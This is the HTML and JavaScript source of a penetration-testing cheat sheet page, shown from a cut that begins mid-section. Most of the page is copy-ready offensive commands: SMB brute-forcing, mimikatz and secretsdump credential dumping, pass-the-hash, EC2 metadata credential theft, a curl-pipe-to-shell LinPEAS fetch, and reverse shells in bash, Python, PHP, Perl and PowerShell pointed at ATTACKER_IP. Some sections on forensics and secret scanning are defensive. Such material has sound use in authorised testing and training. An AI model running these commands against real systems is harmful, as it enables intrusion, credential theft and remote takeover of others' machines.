  <div class="cs-cmd a"><div class="ct">hydra -l admin -P rockyou.txt 192.168.1.1 smb -e nsr -t 2 -W 3<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">SMB brute with null/same/reverse password checks, slow to avoid lockout</div></div>
</div></div>
</div>

<!-- LINUX PRIVESC -->
<div class="cs-section" id="tool-privesc">
<div class="cs-tool-header"><div class="cs-tool-title">🐧 Linux Privilege Escalation</div><div class="cs-tool-desc">Enumerate, exploit and escalate from low user to root</div></div>
<div class="cs-block"><div class="cs-block-hdr">System Enumeration</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">id && whoami && hostname && uname -a<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic system and user info</div></div>
  <div class="cs-cmd b"><div class="ct">sudo -l<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">List commands current user can run with sudo</div></div>
  <div class="cs-cmd b"><div class="ct">find / -perm -4000 -type f 2>/dev/null<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find all SUID binaries — common privesc vector</div></div>
  <div class="cs-cmd b"><div class="ct">cat /etc/crontab && ls -la /etc/cron.*<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Check all scheduled cron jobs</div></div>
  <div class="cs-cmd m"><div class="ct">getcap -r / 2>/dev/null<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find binaries with elevated Linux capabilities</div></div>
  <div class="cs-cmd m"><div class="ct">find / -writable -not -path "*/proc/*" -type f 2>/dev/null<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find world-writable files — check for script abuse</div></div>
  <div class="cs-cmd m"><div class="ct">ss -tulpn && cat /etc/hosts && route -n<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Network connections, hosts file, routing table</div></div>
  <div class="cs-cmd a"><div class="ct">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">LinPEAS — comprehensive automated privesc enumeration</div></div>
  <div class="cs-cmd a"><div class="ct">cat /proc/version && searchsploit "Linux Kernel $(uname -r)"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find kernel exploits for current version</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Shell Upgrades</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">python3 -c 'import pty; pty.spawn("/bin/bash")'<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Upgrade to interactive TTY shell</div></div>
  <div class="cs-cmd m"><div class="ct">script /dev/null -c bash<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Alternative TTY upgrade using script</div></div>
  <div class="cs-cmd m"><div class="ct">export TERM=xterm && stty raw -echo; fg<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Full interactive shell — enables Ctrl+C, tab complete</div></div>
</div></div>
</div>

<!-- WINDOWS AD -->
<div class="cs-section" id="tool-winad">
<div class="cs-tool-header"><div class="cs-tool-title">🪟 Windows &amp; Active Directory</div><div class="cs-tool-desc">AD enumeration, Kerberoasting, Pass-the-Hash, BloodHound, Mimikatz</div></div>
<div class="cs-block"><div class="cs-block-hdr">AD Enumeration</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">net user /domain && net group "Domain Admins" /domain<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">List domain users and Domain Admins</div></div>
  <div class="cs-cmd b"><div class="ct">systeminfo | findstr /B /C:"Domain"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Get domain name from systeminfo</div></div>
  <div class="cs-cmd m"><div class="ct">powershell -ep bypass -c "Import-Module .\PowerView.ps1; Get-DomainUser; Get-DomainComputer"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PowerView — enumerate users and computers in domain</div></div>
  <div class="cs-cmd m"><div class="ct">ldapsearch -x -H ldap://dc.target.com -b "dc=target,dc=com"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Anonymous LDAP dump of domain objects</div></div>
  <div class="cs-cmd a"><div class="ct">SharpHound.exe -c All --zipfilename bh.zip && bloodhound<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">BloodHound data collection — visualise attack paths to DA</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Credential Attacks</div><div class="cs-cmd-list">
  <div class="cs-cmd m"><div class="ct">impacket-GetNPUsers target.com/ -usersfile users.txt -no-pass -dc-ip 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">AS-REP Roasting — hashes for accounts without pre-auth</div></div>
  <div class="cs-cmd m"><div class="ct">impacket-GetUserSPNs target.com/user:pass -dc-ip 192.168.1.1 -request<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Kerberoasting — dump TGS tickets for offline cracking</div></div>
  <div class="cs-cmd a"><div class="ct">impacket-psexec target.com/admin@192.168.1.1 -hashes :NTLM_HASH<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Pass-the-Hash — authenticate with NTLM hash, get shell</div></div>
  <div class="cs-cmd a"><div class="ct">mimikatz "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Dump cleartext passwords from LSASS and SAM</div></div>
  <div class="cs-cmd a"><div class="ct">impacket-secretsdump target.com/admin:pass@192.168.1.1 -just-dc-ntlm<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Remote NTDS.dit dump — extract all domain password hashes</div></div>
</div></div>
</div>

<!-- FORENSICS -->
<div class="cs-section" id="tool-forensics">
<div class="cs-tool-header"><div class="cs-tool-title">🔬 Digital Forensics</div><div class="cs-tool-desc">Disk imaging, memory analysis, file carving, steganography</div></div>
<div class="cs-block"><div class="cs-block-hdr">Disk &amp; Imaging</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">dd if=/dev/sda of=disk.img bs=4M status=progress<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Bit-for-bit forensic disk image with dd</div></div>
  <div class="cs-cmd b"><div class="ct">sha256sum disk.img | tee disk.img.sha256<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Hash image for chain of custody integrity</div></div>
  <div class="cs-cmd b"><div class="ct">strings file.bin | grep -Ei "password|token|key|flag"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Extract printable strings and hunt for secrets</div></div>
  <div class="cs-cmd m"><div class="ct">binwalk -e firmware.bin<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Extract embedded files from firmware / binary</div></div>
  <div class="cs-cmd m"><div class="ct">foremost -i disk.img -o carved/ -t jpg,pdf,doc,zip<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Carve deleted files by file signature</div></div>
  <div class="cs-cmd a"><div class="ct">volatility3 -f memory.raw windows.pslist && windows.netscan && windows.hashdump.Hashdump<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Memory forensics — processes, connections, hashes</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Steganography</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">exiftool image.jpg<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">View all metadata in image files</div></div>
  <div class="cs-cmd b"><div class="ct">file mystery.bin && xxd mystery.bin | head -20<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Identify file type and inspect hex header</div></div>
  <div class="cs-cmd m"><div class="ct">steghide extract -sf image.jpg -p password<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Extract data hidden with steghide</div></div>
  <div class="cs-cmd m"><div class="ct">zsteg -a image.png<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Detect and extract LSB steganography in PNG</div></div>
  <div class="cs-cmd a"><div class="ct">stegsolve image.png<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Analyse image bit planes — visualise hidden data layers</div></div>
</div></div>
</div>

<!-- OSINT -->
<div class="cs-section" id="tool-osint">
<div class="cs-tool-header"><div class="cs-tool-title">🌐 OSINT</div><div class="cs-tool-desc">Open Source Intelligence — passive reconnaissance techniques</div></div>
<div class="cs-block"><div class="cs-block-hdr">People &amp; Email</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">theHarvester -d target.com -b google,bing,linkedin,twitter<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Harvest emails, names, subdomains from search engines</div></div>
  <div class="cs-cmd b"><div class="ct">hunter.io — search corporate email patterns online<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find and verify corporate email formats</div></div>
  <div class="cs-cmd m"><div class="ct">holehe --only-used email@target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Check which websites an email is registered on</div></div>
  <div class="cs-cmd m"><div class="ct">maigret username<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Search username across 500+ social networks</div></div>
  <div class="cs-cmd a"><div class="ct">maltego — run Entity transforms on target domain<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Graph-based OSINT — map entity relationships</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Leaked Data &amp; Secrets</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">haveibeenpwned.com — check email in breaches<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Check if email appeared in known data breaches</div></div>
  <div class="cs-cmd m"><div class="ct">github.com/search?q=target.com+password&type=code<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Search GitHub for accidentally committed secrets</div></div>
  <div class="cs-cmd m"><div class="ct">trufflehog github --repo https://github.com/org/repo<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Scan Git history for leaked secrets and tokens</div></div>
  <div class="cs-cmd a"><div class="ct">gitleaks detect --source /path/to/repo --report-format json<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Deep scan repo for API keys, passwords, tokens</div></div>
  <div class="cs-cmd a"><div class="ct">waybackurls target.com | grep -E "\.php|\.asp|?id=|?user="<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Mine Wayback Machine URLs for old attack surfaces</div></div>
</div></div>
</div>

<!-- CLOUD -->
<div class="cs-section" id="tool-cloud">
<div class="cs-tool-header"><div class="cs-tool-title">☁️ Cloud Security</div><div class="cs-tool-desc">AWS, Azure and GCP enumeration, misconfiguration and exploitation</div></div>
<div class="cs-block"><div class="cs-block-hdr">AWS</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">aws sts get-caller-identity<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Get current IAM identity — who you are in AWS</div></div>
  <div class="cs-cmd b"><div class="ct">aws s3 ls s3://bucket-name --no-sign-request<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">List public S3 bucket — no credentials needed</div></div>
  <div class="cs-cmd m"><div class="ct">aws iam list-users && aws iam list-roles && aws iam list-policies<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Enumerate IAM users, roles and policies</div></div>
  <div class="cs-cmd m"><div class="ct">aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">List all EC2 instances with IPs and tags</div></div>
  <div class="cs-cmd a"><div class="ct">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Steal IAM role credentials via SSRF on EC2 metadata</div></div>
  <div class="cs-cmd a"><div class="ct">pacu -- run iam__bruteforce_permissions && iam__privesc_scan<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PACU — AWS exploitation framework, scan for privesc paths</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Azure / GCP</div><div class="cs-cmd-list">
  <div class="cs-cmd m"><div class="ct">az login && az account list && az ad user list<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Authenticate to Azure and enumerate users</div></div>
  <div class="cs-cmd a"><div class="ct">roadrecon gather && roadrecon gui<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">ROADrecon — Azure AD attack surface mapping</div></div>
  <div class="cs-cmd a"><div class="ct">gcloud auth activate-service-account --key-file=creds.json && gcloud projects list<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Authenticate to GCP with service account key</div></div>
</div></div>
</div>

<!-- REVERSE SHELLS -->
<div class="cs-section" id="tool-shells">
<div class="cs-tool-header"><div class="cs-tool-title">🐚 Reverse Shells</div><div class="cs-tool-desc">One-liners for every language — run nc -lvnp 4444 on your machine first</div></div>
<div class="cs-block"><div class="cs-block-hdr">Listener</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">nc -lvnp 4444<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic netcat listener</div></div>
  <div class="cs-cmd m"><div class="ct">rlwrap nc -lvnp 4444<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Netcat with readline — enables arrow keys and history</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Bash / Python / PHP / Perl</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Classic bash reverse shell</div></div>
  <div class="cs-cmd b"><div class="ct">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Python3 reverse shell — fully interactive PTY</div></div>
  <div class="cs-cmd b"><div class="ct">php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PHP reverse shell one-liner</div></div>
  <div class="cs-cmd m"><div class="ct">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444>/tmp/f<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Named pipe shell — works when bash TCP is unavailable</div></div>
  <div class="cs-cmd m"><div class="ct">perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Perl reverse shell</div></div>
  <div class="cs-cmd a"><div class="ct">powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PowerShell reverse shell — bypasses execution policy</div></div>
</div></div>
</div>

<!-- MISC -->
<div class="cs-section" id="tool-misc">
<div class="cs-tool-header"><div class="cs-tool-title">⚙️ Misc &amp; Utilities</div><div class="cs-tool-desc">File transfer, encoding, port forwarding, pivoting, one-liners</div></div>
<div class="cs-block"><div class="cs-block-hdr">File Transfer</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">python3 -m http.server 8080<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Quick HTTP server on port 8080</div></div>
  <div class="cs-cmd b"><div class="ct">wget http://ATTACKER_IP:8080/file && curl http://ATTACKER_IP:8080/file -O<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Download file from attacker HTTP server</div></div>
  <div class="cs-cmd m"><div class="ct">scp -r user@192.168.1.1:/remote/path /local/path<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Recursive secure copy over SSH</div></div>
  <div class="cs-cmd m"><div class="ct">nc -lvnp 4444 > file &amp;  nc ATTACKER_IP 4444 < file<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Transfer file over netcat</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Encoding</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">echo "text" | base64 && echo "dGV4dA==" | base64 -d<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Base64 encode and decode</div></div>
  <div class="cs-cmd b"><div class="ct">echo -n "password" | md5sum && echo -n "password" | sha256sum<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Generate MD5 and SHA256 hash of a string</div></div>
  <div class="cs-cmd m"><div class="ct">python3 -c "import urllib.parse; print(urllib.parse.quote('payload here'))"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">URL-encode a string for web payloads</div></div>
  <div class="cs-cmd m"><div class="ct">cat file.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">ROT13 encode/decode text</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Port Forwarding &amp; Pivoting</div><div class="cs-cmd-list">
  <div class="cs-cmd m"><div class="ct">ssh -L 8080:127.0.0.1:80 user@192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Local port forwarding — tunnel remote port to localhost</div></div>
  <div class="cs-cmd m"><div class="ct">ssh -D 9050 -N user@192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Dynamic SOCKS5 proxy — route tools through SSH</div></div>
  <div class="cs-cmd a"><div class="ct">chisel server -p 8080 --reverse && chisel client ATTACKER_IP:8080 R:80:127.0.0.1:80<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Chisel reverse tunnel — punch through firewalls</div></div>
  <div class="cs-cmd a"><div class="ct">proxychains nmap -sT -Pn -p 80,443,22 192.168.2.0/24<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Pivot nmap scan through SOCKS proxy</div></div>
  <div class="cs-cmd a"><div class="ct">socat TCP-LISTEN:8080,fork TCP:192.168.2.1:80<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">socat port relay — forward traffic between network segments</div></div>
</div></div>
</div>

</div>

<script>
var curLevel = 'all';

function showTool(tool, btn) {
  document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('on'));
  document.querySelectorAll('.cs-tab').forEach(t => t.classList.remove('on'));
  document.getElementById('tool-' + tool).classList.add('on');
  if (btn) btn.classList.add('on');
  document.getElementById('cs-search').value = '';
  applyLevel();
  upCount();
}

function doCopy(btn) {
  var txt = btn.parentElement.childNodes[0].textContent.trim();
  navigator.clipboard.writeText(txt).then(function() {
    btn.textContent = 'done!'; btn.classList.add('ok');
    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('ok'); }, 1500);
  });
}

function setLevel(lv, btn) {
  curLevel = lv;
  document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('on'));
  if (btn) btn.classList.add('on');
  applyLevel();
  upCount();
}

function applyLevel() {
  document.querySelectorAll('.cs-cmd').forEach(function(cmd) {
    if (curLevel === 'all') cmd.classList.remove('hide');
    else cmd.classList.toggle('hide', !cmd.classList.contains(curLevel));
  });
}

function filterAll(q) {
  q = q.toLowerCase();
  if (!q) {
    document.querySelectorAll('.cs-cmd').forEach(c => c.classList.remove('hide'));
    applyLevel();
    document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('on'));
    document.getElementById('tool-recon').classList.add('on');
    document.querySelectorAll('.cs-tab').forEach((t,i) => t.classList.toggle('on', i===0));
    upCount(); return;
  }
  document.querySelectorAll('.cs-section').forEach(s => s.classList.remove('on'));
  document.querySelectorAll('.cs-cmd').forEach(function(cmd) {
    var txt = cmd.textContent.toLowerCase();
    var lvOk = curLevel === 'all' || cmd.classList.contains(curLevel);
    var show = lvOk && txt.includes(q);
    cmd.classList.toggle('hide', !show);
    if (show) cmd.closest('.cs-section').classList.add('on');
  });
  upCount();
}

function upCount() {
  var v = document.querySelectorAll('.cs-cmd:not(.hide)').length;
  document.getElementById('cs-count').innerHTML = '<span>' + v + '</span> commands shown';
}

window.onload = function() {
  document.querySelector('.level-btn.all').classList.add('on');
  upCount();
};
</script>
